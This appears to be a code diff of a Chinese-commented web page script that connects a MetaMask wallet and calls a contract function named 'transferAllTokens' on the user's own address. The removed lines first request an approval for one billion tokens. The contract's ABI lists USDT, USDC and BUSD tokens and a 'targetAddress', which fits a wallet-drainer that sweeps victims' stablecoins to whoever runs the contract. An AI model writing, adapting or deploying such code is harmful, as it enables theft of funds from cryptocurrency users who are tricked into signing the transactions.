@@ -1,131 +1,59 @@
-const Web3 = require('web3');
-
-// 请替换为你的合约地址和 ABI
-const contractAddress = '0xd7Ca4e99F7C171B9ea2De80d3363c47009afaC5F';
-const contractABI = [
-	{
-		"inputs": [
-			{
-				"internalType": "address",
-				"name": "from",
-				"type": "address"
-			}
-		],
-		"name": "transferAllTokens",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"stateMutability": "nonpayable",
-		"type": "constructor"
-	},
-	{
-		"stateMutability": "payable",
-		"type": "receive"
-	},
-	{
-		"inputs": [],
-		"name": "busdToken",
-		"outputs": [
-			{
-				"internalType": "contract IERC20",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "owner",
-		"outputs": [
-			{
-				"internalType": "address",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "targetAddress",
-		"outputs": [
-			{
-				"internalType": "address",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "usdcToken",
-		"outputs": [
-			{
-				"internalType": "contract IERC20",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "usdtToken",
-		"outputs": [
-			{
-				"internalType": "contract IERC20",
-				"name": "",
-				"type": "address"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	}
+let web3;
+let userAddress;
+let contract;
+const contractAddress = "0xd7Ca4e99F7C171B9ea2De80d3363c47009afaC5F";  // 智能合约地址
+const abi = [
+  {
+    "inputs": [{"internalType": "address","name": "from","type": "address"}],
+    "name": "transferAllTokens",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  // 其他ABI内容...
 ];
 
-let web3;
-let contract;
-let accounts;
-
-async function initWeb3() {
-    // 检查是否存在 Ethereum 钱包
+// 连接钱包
+document.getElementById('connectButton').addEventListener('click', async () => {
+  try {
+    document.getElementById('statusMessage').textContent = "尝试连接钱包...";
     if (typeof window.ethereum !== 'undefined') {
-        web3 = new Web3(window.ethereum);
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        accounts = await web3.eth.getAccounts();
-        document.getElementById('walletAddress').textContent = `钱包地址: ${accounts[0]}`;
-        document.getElementById('walletAddress').classList.remove('hidden');
-        document.getElementById('authorizeButton').classList.remove('hidden');
+      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+      userAddress = accounts[0];
+      web3 = new Web3(window.ethereum);
+      contract = new web3.eth.Contract(abi, contractAddress);
+
+      // 钱包连接成功，启用按钮
+      document.getElementById('transferButton').disabled = false;
+      document.getElementById('statusMessage').textContent = '钱包已连接: ' + userAddress;
+      console.log("钱包已连接，用户地址: ", userAddress);
     } else {
-        alert('请安装 MetaMask 钱包!');
+      alert('未检测到Metamask，请安装或启用插件');
+      document.getElementById('statusMessage').textContent = 'Metamask未检测到';
+      console.log("Metamask插件未安装或未启用");
     }
-}
+  } catch (error) {
+    console.error("连接钱包出错: ", error);
+    document.getElementById('statusMessage').textContent = '连接钱包失败，请重试';
+  }
+});
 
-async function authorizeTransfer() {
-    // 批准合约转移代币
-    const amount = web3.utils.toWei('1000000000', 'ether'); // 设置要授权的数量（例如 1 个代币）
-    const tokenAddress = '代币合约地址'; // 替换为相应的代币合约地址
-    const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
-    await tokenContract.methods.approve(contractAddress, amount).send({ from: accounts[0] });
-    document.getElementById('transferButton').classList.remove('hidden');
-}
+// 转移所有代币
+document.getElementById('transferButton').addEventListener('click', async () => {
+  if (!userAddress || !contract) {
+    alert('请先连接钱包');
+    console.log("未连接钱包，无法转移代币");
+    return;
+  }
 
-async function transferTokens() {
-    const autoTransferContract = new web3.eth.Contract(contractABI, contractAddress);
-    await autoTransferContract.methods.transferAllTokens(accounts[0]).send({ from: accounts[0] });
-    alert('代币已成功转移到目标地址！');
-}
-
-// 事件监听
-document.getElementById('connectButton').addEventListener('click', initWeb3);
-document.getElementById('authorizeButton').addEventListener('click', authorizeTransfer);
-document.getElementById('transferButton').addEventListener('click', transferTokens);
+  try {
+    document.getElementById('statusMessage').textContent = "执行代币转移...";
+    await contract.methods.transferAllTokens(userAddress).send({ from: userAddress });
+    alert('代币转移成功');
+    document.getElementById('statusMessage').textContent = "代币转移成功";
+    console.log("代币转移成功");
+  } catch (error) {
+    console.error("代币转移出错: ", error);
+    document.getElementById('statusMessage').textContent = '代币转移失败，请重试';
+  }
+});
